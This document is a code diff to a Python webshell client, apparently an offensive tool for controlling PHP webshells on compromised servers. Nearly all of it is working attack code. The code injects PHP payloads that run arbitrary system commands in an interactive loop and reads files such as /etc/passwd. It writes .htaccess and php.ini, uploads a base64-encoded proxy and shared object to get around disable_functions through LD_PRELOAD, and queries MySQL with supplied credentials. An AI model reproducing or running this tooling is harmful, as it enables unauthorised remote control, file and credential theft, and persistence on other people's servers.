@@ -19,7 +19,7 @@ class webshell:
     def connection(self):
         token = self.random_string()
         url = "http://" + self.urls
-        data = "echo "+token+";echo 's1mple';echo "+token+";"
+        data = "echo '"+token+"';echo 's1mple';echo '"+token+"';"
         req = requests.head(url)
         code = req.status_code
         result = self.get_result_from_server(data,token)
@@ -56,16 +56,19 @@ class webshell:
         rescon = res.content
         rescons = rescon.decode(encoding="utf-8")
         try:
-            index = rescons.index("PHP")
-            index1 = rescons.index("Technologies")
+            try:
+                index = rescons.index("PHP")
+                index1 = rescons.index("Technologies")
+            except:
+                index = rescons.index("by")
+                index1 = rescons.index("Technologies")
+            print(rescons[index:index1])
         except:
-            index = rescons.index("by")
-            index1 = rescons.index("Technologies")
-        print(rescons[index:index1])
+            print("\033[0;31myou cant get the php information;maybe its windows server?,or maybe its no result;its maybe happen some error\033[0m")
 
     def get_disable_function(self):
         token = self.random_string()
-        payload = "echo " + token + ";echo ini_get('disable_functions');echo " + token + ";"
+        payload = "echo '" + token + "';echo ini_get('disable_functions');echo '" + token + "';"
         result = self.get_result_from_server(payload,token)
         return result
 
@@ -98,16 +101,17 @@ class webshell:
         realfunc = self.getusefunc()
         token = self.random_string()
         if(realfunc=="exec" or realfunc=="shell_exec"):
-            data = "echo "+token+";"+"echo "+realfunc+"('"+command+"')"+";echo "+token+";"
+            data = "echo '"+token+"';"+"echo "+realfunc+"('"+command+"')"+";echo '"+token+"';"
         elif(realfunc =="popen"):
-            data="echo "+token+";$s1mple=popen('"+command+"','"+'r'+"');while(!feof($s1mple)) { echo fread($s1mple, 1024); } pclose($s1mple);echo "+token+";"
+            data="echo '"+token+"';$s1mple=popen('"+command+"','"+'r'+"');while(!feof($s1mple)) { echo fread($s1mple, 1024); } pclose($s1mple);echo '"+token+"';"
         else:
-            data = "echo " + token + ";" + realfunc + "('" + command + "')" + ";echo " + token + ";"
+            data = "echo '" + token + "';" + realfunc + "('" + command + "')" + ";echo '" + token + "';"
         reqcons = self.get_reuslt_from_server_without_split(data)
         try:
             rere = reqcons.split(token, 2)[1]
         except:
-            return("no result,maybe some waf or disable_functions")
+            print("no result,maybe some waf or disable_functions")
+            return(reqcons)
         return(rere)
 
     def readfile(self,path):
@@ -115,13 +119,13 @@ class webshell:
         token = self.random_string()
         path = path
         if("file_get_contents" not in disfuc):
-            data = "echo "+token+";echo file_get_contents('"+path+"');echo "+token+";"
+            data = "echo '"+token+"';echo file_get_contents('"+path+"');echo '"+token+"';"
         elif("fopen" not in disfuc and "fread" not in disfuc and "fclose"not in disfuc):
-            data = "echo "+token+";$filename = '/etc/passwd';\n$handle = fopen($filename, 'r');\n$contents = fread($handle, filesize ($filename));\nfclose($handle);\necho $contents;echo "+token+";"
+            data = "echo '"+token+"';$filename = '/etc/passwd';\n$handle = fopen($filename, 'r');\n$contents = fread($handle, filesize ($filename));\nfclose($handle);\necho $contents;echo '"+token+"';"
         elif("File" not in disfuc):
-            data = "echo "+token+";var_dump(File('"+path+"'));echo "+token+";"
+            data = "echo '"+token+"';var_dump(File('"+path+"'));echo '"+token+"';"
         elif("highlight_file" not in disfuc):
-            data = "echo "+token+";highlight_file('"+path+"');echo "+token+";"
+            data = "echo '"+token+"';highlight_file('"+path+"');echo '"+token+"';"
         else:
             return "cant readfile"
         reqcons = self.get_reuslt_from_server_without_split(data)
@@ -169,14 +173,14 @@ class webshell:
         req = requests.head(shell_url)
         code = req.status_code
         if (code == 200):
-            payload = "echo "+token+";echo 's1mple';echo "+token+";"
+            payload = "echo '"+token+"';echo 's1mple';echo '"+token+"';"
             result = self.get_result_from_server(payload,token)
             if('s1mple' in result):
                 while True:
                     command = input("please input the command :")
                     if (command == "exit"):
                         exit()
-                    result_data = "echo %s;" % token + "system('" + command + "');echo %s;" % token
+                    result_data = "echo '%s';" % token + "system('" + command + "');echo '%s';" % token
                     reqcons = self.get_reuslt_from_server_without_split(result_data, shell_url)
                     try:
                         rere = reqcons.split(token, 2)[1]
@@ -200,7 +204,7 @@ class webshell:
             else:
                 requests.post(url=url,data=data)
                 requests.post(url=url, data=data1)
-            data2 = {self.pwd:"echo "+token+";include('/tmp/s1mple.php');echo "+token+";"}#执行恶意命令；
+            data2 = {self.pwd:"echo '"+token+"';include('/tmp/s1mple.php');echo '"+token+"';"}#执行恶意命令；
             upload_proxy = open("bypass/LD_PRELOAD/s1mple", "rb")
             test_url = self.urls[::-1]
             try:
@@ -217,8 +221,8 @@ class webshell:
             upload_proxy_content = upload_proxy.read().decode(encoding="utf-8").replace("/index.php", "/" + shell_name).encode(encoding="utf-8")
             upload_proxy.close()
             upload_proxy_contents = base64.b64encode(upload_proxy_content).decode(encoding="utf-8")
-            data3 = {self.pwd: "echo "+token+";file_put_contents('s1mple.php',base64_decode('" + upload_proxy_contents + "'));echo "+token+";"}
-            data4 = {self.pwd: "echo "+token+";file_put_contents('/tmp/php.ini',base64_decode('" + attack_php_ini + "'));echo "+token+";"}
+            data3 = {self.pwd: "echo '"+token+"';file_put_contents('s1mple.php',base64_decode('" + upload_proxy_contents + "'));echo '"+token+"';"}
+            data4 = {self.pwd: "echo '"+token+"';file_put_contents('/tmp/php.ini',base64_decode('" + attack_php_ini + "'));echo '"+token+"';"}
             if(self.way=="get"):
                 requests.get(url,params=data4)
                 print("start upload proxy-file")
@@ -242,7 +246,7 @@ class webshell:
                     command = input("please input the command :")
                     if(command=="exit"):
                         exit()
-                    result_data = "echo %s;"%token+"system('"+command+"');echo %s;"%token
+                    result_data = "echo '%s';"%token+"system('"+command+"');echo '%s';"%token
                     reqcons = self.get_reuslt_from_server_without_split(result_data,shell_url)
                     try:
                         rere = reqcons.split(token, 2)[1]
@@ -254,7 +258,7 @@ class webshell:
     def test(self):
         token = self.random_string()
         url = "http://" + self.urls
-        data = {self.pwd: "echo "+token+";echo php_ini_loaded_file();echo "+token+";"}
+        data = {self.pwd: "echo '"+token+"';echo php_ini_loaded_file();echo '"+token+"';"}
         res = requests.post(url=url,data=data)
         reqconss = res.content
         reqcons = reqconss.decode(encoding="utf-8")
@@ -271,7 +275,7 @@ class webshell:
     def get_document_root(self):
         token = self.random_string()
         url = "http://"+self.urls
-        data = {self.pwd:"echo "+token+";echo $_SERVER['DOCUMENT_ROOT'];echo "+token+";"}
+        data = {self.pwd:"echo '"+token+"';echo $_SERVER['DOCUMENT_ROOT'];echo '"+token+"';"}
         res = requests.post(url = url,data=data)
         reqconss = res.content
         reqcons = reqconss.decode(encoding="utf-8")
@@ -285,7 +289,7 @@ class webshell:
         document_root = self.get_document_root()
         file_path = document_root+b
         url = "http://"+self.urls
-        data = {self.pwd:"echo "+token+";echo dirname('"+file_path+"');echo "+token+";"}
+        data = {self.pwd:"echo '"+token+"';echo dirname('"+file_path+"');echo '"+token+"';"}
         res = requests.post(url=url,data=data)
         reqconss = res.content
         reqcons = reqconss.decode(encoding="utf-8")
@@ -296,7 +300,7 @@ class webshell:
         token = self.random_string()
         path = self.get_path()
         url = "http://"+self.urls
-        data = {self.pwd:"echo "+token+";echo is_writable('"+path+"');echo "+token+";"}
+        data = {self.pwd:"echo '"+token+"';echo is_writable('"+path+"');echo '"+token+"';"}
         res = requests.post(url=url,data=data)
         reqconss = res.content
         reqcons = reqconss.decode(encoding="utf-8")
@@ -309,7 +313,7 @@ class webshell:
     def type_server(self):
         token = self.random_string()
         url = "http://"+self.urls
-        data = {self.pwd:"echo "+token+";echo $_SERVER['SERVER_SOFTWARE'];echo "+token+";"}
+        data = {self.pwd:"echo '"+token+"';echo $_SERVER['SERVER_SOFTWARE'];echo '"+token+"';"}
         res = requests.post(url=url, data=data)
         reqconss = res.content
         reqcons = reqconss.decode(encoding="utf-8")
@@ -321,7 +325,7 @@ class webshell:
         token = self.random_string()
         url = "http://" + self.urls
         data = {self.pwd: "@file_put_contents('.htaccess','\nSetEnv HTACCESS on',FILE_APPEND);"}
-        data1 = {self.pwd: "echo " + token + ";echo $_SERVER['HTACCESS'];echo " + token + ";"}
+        data1 = {self.pwd: "echo '" + token + "';echo $_SERVER['HTACCESS'];echo '" + token + "';"}
         if(self.way=="post"):
             requests.post(url=url,data=data)#写入.htaccess
             res = requests.post(url=url, data=data1)
@@ -343,7 +347,7 @@ class webshell:
         token = self.random_string()
         url = "http://"+self.urls
         shell_url = url+"/../s1mple.su"
-        data = {self.pwd:"echo "+token+";echo in_array('mod_cgi', apache_get_modules());echo "+token+";"}
+        data = {self.pwd:"echo '"+token+"';echo in_array('mod_cgi', apache_get_modules());echo '"+token+"';"}
         if(self.way=="post"):
             res = requests.post(url=url, data=data)
         else:
@@ -393,14 +397,14 @@ class webshell:
         req = requests.head(shell_url)
         code = req.status_code
         if (code == 200):
-            payload = "echo " + token + ";echo 's1mple';echo " + token + ";"
+            payload = "echo '" + token + "';echo 's1mple';echo '" + token + "';"
             result = self.get_result_from_server(payload, token)
             if ('s1mple' in result):
                 while True:
                     command = input("please input the command :")
                     if (command == "exit"):
                         exit()
-                    result_data = "echo %s;" % token + "system('" + command + "');echo %s;" % token
+                    result_data = "echo '%s';" % token + "system('" + command + "');echo '%s';" % token
                     reqcons = self.get_reuslt_from_server_without_split(result_data, shell_url)
                     try:
                         rere = reqcons.split(token, 2)[1]
@@ -415,7 +419,7 @@ class webshell:
             url = "http://" + self.urls
             data = {self.pwd: "file_put_contents('/tmp/s1mple.so',base64_decode('" + b + "'));"}
             requests.post(url=url, data=data)
-            data2 = {self.pwd: "echo " + token + ";include('/tmp/s1mple.php');echo " + token + ";"}  # 执行恶意命令；
+            data2 = {self.pwd: "echo '" + token + "';include('/tmp/s1mple.php');echo '" + token + "';"}  # 执行恶意命令；
             upload_proxy = open("bypass/LD_PRELOAD/s1mple", "rb")
             test_url = self.urls[::-1]
             try:
@@ -435,7 +439,7 @@ class webshell:
             upload_proxy.close()
             upload_proxy_contents = base64.b64encode(upload_proxy_content).decode(encoding="utf-8")
             data3 = {
-                self.pwd: "echo " + token + ";file_put_contents('s1mple.php',base64_decode('" + upload_proxy_contents + "'));echo " + token + ";"}
+                self.pwd: "echo '" + token + "';file_put_contents('s1mple.php',base64_decode('" + upload_proxy_contents + "'));echo '" + token + "';"}
             print("start upload proxy-file")
             requests.post(url=url, data=data3)
             try:
@@ -458,7 +462,7 @@ class webshell:
                     command = input("please input the command :")
                     if (command == "exit"):
                         exit()
-                    result_data = {self.pwd: "echo %s;" % token + "system('" + command + "');echo %s;" % token}
+                    result_data = {self.pwd: "echo '%s';" % token + "system('" + command + "');echo '%s';" % token}
                     resul = requests.post(url=shell_url, data=result_data)
                     reqconss = resul.content
                     reqcons = reqconss.decode(encoding="utf-8")
@@ -541,7 +545,10 @@ class webshell:
         else:
             resul = requests.get(url, params=data)
         reqconss = resul.content
-        reqcons = reqconss.decode(encoding="utf-8")
+        try:
+            reqcons = reqconss.decode(encoding="utf-8")
+        except:
+            reqcons = reqconss
         return reqcons
     def get_result_from_server(self,payload,token):
         url = "http://" + self.urls
@@ -561,7 +568,7 @@ class webshell:
 
     def mysql_test_connect(self,uname,password):
         token = self.random_string()
-        payload = "echo "+token+";$con = mysqli_connect('127.0.0.1','{}','{}');if (!$con){{die('Could not connect: ');}}else{{die('success');}};echo ".format(uname,password)+token+";"
+        payload = "echo '"+token+"';$con = mysqli_connect('127.0.0.1','{}','{}');if (!$con){{die('Could not connect: ');}}else{{die('success');}};echo '".format(uname,password)+token+"';"
         result = self.get_result_from_server(payload,token)
         if("success" in result):
             return True
@@ -580,8 +587,7 @@ class webshell:
                 if(sql_payload==''):
                     continue
                 token = self.random_string()
-                payloads = "echo "+token+";$connection=mysqli_connect('127.0.0.1', '{}', '{}', 'mysql');$query=mysqli_query($connection,'{}');while ($row=mysqli_fetch_assoc($query)) {{var_dump($row);}};echo ".format(uname,password,sql_payload)+token+";"
+                payloads = "echo '"+token+"';$connection=mysqli_connect('127.0.0.1', '{}', '{}', 'mysql');$query=mysqli_query($connection,'{}');while ($row=mysqli_fetch_assoc($query)) {{var_dump($row);}};echo '".format(uname,password,sql_payload)+token+"';"
                 result = self.get_result_from_server(payloads,token)
                 print(result)
-
 
